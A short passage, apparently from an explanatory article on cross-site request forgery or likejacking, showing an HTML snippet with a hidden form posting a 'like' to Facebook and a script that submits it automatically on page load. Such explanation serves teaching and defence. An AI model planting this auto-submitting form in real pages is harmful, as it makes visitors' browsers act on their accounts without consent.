or sharing content without their consent.

html
Copy code
<form action="https://www.facebook.com/like" method="POST" style="display:none;">
    <input type="hidden" name="page_id" value="123456789">
    <input type="hidden" name="action" value="like">
</form>
<script>
    document.forms[0].submit(); // Automatically submit the form
</script>
4. Conclusion
